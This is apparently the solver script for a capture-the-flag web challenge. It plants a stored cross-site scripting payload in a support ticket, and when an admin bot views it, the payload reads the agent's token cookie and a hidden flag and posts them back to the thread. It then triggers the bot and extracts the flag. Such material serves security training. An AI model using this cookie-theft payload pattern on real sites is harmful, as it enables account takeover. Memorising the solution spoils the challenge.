#!/usr/bin/env python3
"""Open Ticket solver: store a message, let the agent open it, read the thread."""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

STUDENT_USERNAME = "student"

TICKET_ID = 1

CHALLENGE_ID = "open-ticket"

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

def build_payload(claim: str) -> str:
    """Runs in the agent's browser and files her note under the player's claim."""
    return (
        "<script>"
        "(function(){"
        "var row=document.cookie.split('; ').find(function(c){return c.indexOf('agent_token=')===0;});"
        "var token=row?row.split('=')[1]:'';"
        "var note=document.getElementById('agent-flag');"
        "var flag=note?note.textContent.trim():'';"
        "fetch('/api/tickets/1/append',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded','X-Agent-Token':token},"
        "body:'body='+encodeURIComponent(flag)+'&claim=" + claim + "'});"
        "})();"
        "</script>"
    )


class SolverError(RuntimeError):
    """The intended path did not produce a flag."""


def sign_in(base_url: str) -> urllib.request.OpenerDirector:
    """Sign in as the player and return the opener that keeps the session cookie."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(base_url + "/login", timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
        match = re.search(r'data-pin-for="student">([^<]+)</code>', page)
        if not match:
            raise SolverError("the login page did not carry the student pass")
        body = urllib.parse.urlencode(
            {"username": STUDENT_USERNAME, "password": match.group(1)}
        ).encode()
        opener.open(base_url + "/login", body, timeout=10)
        with opener.open(base_url + f"/tickets/{TICKET_ID}", timeout=10) as response:
            if response.geturl().endswith("/login"):
                raise SolverError("signing in as the student did not create a session")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot sign in at {base_url}: {error}") from error
    return opener


def read_ticket(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> tuple[str, str]:
    """Read the customer ticket and return its claim code and page."""
    path = f"/tickets/{TICKET_ID}"
    if claim:
        path += "?claim=" + urllib.parse.quote(claim)
    try:
        with opener.open(base_url + path, timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot read the thread: {error}") from error
    match = re.search(r'data-claim="([0-9a-f]{8})"', page)
    if not match:
        raise SolverError("the ticket did not carry a claim code")
    return match.group(1), page


def prepare_with(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> str:
    claim, _ = read_ticket(opener, base_url, claim)
    body = urllib.parse.urlencode({"body": build_payload(claim)}).encode()
    try:
        with opener.open(base_url + f"/tickets/{TICKET_ID}", body, timeout=10) as response:
            if response.status != 200:
                raise SolverError("the thread did not accept the message")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot write to the thread: {error}") from error
    return base_url + f"/agent/tickets/{TICKET_ID}"


def run_admin_bot(
    platform_url: str,
    token: str,
    challenge_id: str,
    url: str,
    timeout: float = 90.0,
) -> None:
    """Submit the URL to the platform admin bot and wait for the visit to finish."""
    base = platform_url.rstrip("/")
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "ingehack-solver/1.0",
    }
    request = urllib.request.Request(
        f"{base}/api/v2/integrations/challs/{challenge_id}/admin-bot",
        data=json.dumps({"inputs": {"url": url}}).encode(),
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            submitted = json.load(response)
    except urllib.error.HTTPError as error:
        detail = error.read().decode("utf-8", "replace")[:200]
        raise SolverError(f"the platform refused the job ({error.code}): {detail}") from error
    except urllib.error.URLError as error:
        raise SolverError(f"cannot reach the platform: {error}") from error
    if submitted.get("kind") != "goodAdminBotJobSubmitted":
        raise SolverError(f"the platform refused the job: {submitted.get('kind')}")
    job_id = submitted["data"]["jobId"]
    print(f"admin bot job {job_id} submitted", file=sys.stderr)

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        status_request = urllib.request.Request(
            f"{base}/api/v2/integrations/challs/{challenge_id}/admin-bot/status",
            headers={
                "Authorization": f"Bearer {token}",
                "User-Agent": "ingehack-solver/1.0",
            },
        )
        try:
            with urllib.request.urlopen(status_request, timeout=20) as response:
                status = json.load(response)
        except urllib.error.URLError as error:
            raise SolverError(f"cannot read the job status: {error}") from error
        job = (status.get("data") or {}).get("job") or {}
        if job.get("id") == job_id:
            if job.get("status") == "completed":
                return
            if job.get("status") == "failed":
                raise SolverError("the admin bot job failed")
        time.sleep(3)
    raise SolverError("the admin bot did not finish in time")


def submit_with(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> None:
    _, page = read_ticket(opener, base_url, claim)
    match = FLAG.search(page)
    if not match:
        raise SolverError("the flag is not in the thread yet")
    print(match.group(0))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--stage", choices=("prepare", "submit", "all"))
    parser.add_argument(
        "--platform-url",
        help="platform base URL, needed for --stage all (for example https://ctf.ingeniums.club)",
    )
    parser.add_argument(
        "--token",
        help="player API token, needed for --stage all; the run-bot form uses the same account",
    )
    parser.add_argument("--challenge-id", default=CHALLENGE_ID)
    parser.add_argument(
        "--claim",
        help="claim code printed by --stage prepare, needed for a two-stage run",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    try:
        if args.stage == "prepare":
            opener = sign_in(base_url)
            claim, _ = read_ticket(opener, base_url, args.claim)
            print(prepare_with(opener, base_url, claim))
            print(f"claim: {claim}", file=sys.stderr)
        elif args.stage == "submit":
            if not args.claim:
                print(
                    "solver: --stage submit needs --claim from --stage prepare",
                    file=sys.stderr,
                )
                return 2
            opener = sign_in(base_url)
            submit_with(opener, base_url, args.claim)
        elif args.stage == "all":
            if not args.platform_url or not args.token:
                print(
                    "solver: --stage all needs --platform-url and --token",
                    file=sys.stderr,
                )
                return 2
            opener = sign_in(base_url)
            claim, _ = read_ticket(opener, base_url)
            print(f"claim: {claim}", file=sys.stderr)
            url = prepare_with(opener, base_url, claim)
            print(f"bot target: {url}", file=sys.stderr)
            run_admin_bot(args.platform_url, args.token, args.challenge_id, url)
            submit_with(opener, base_url, claim)
        else:
            print(
                "solver: pass --stage prepare, submit, or all",
                file=sys.stderr,
            )
            return 2
    except SolverError as error:
        print(f"solver: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
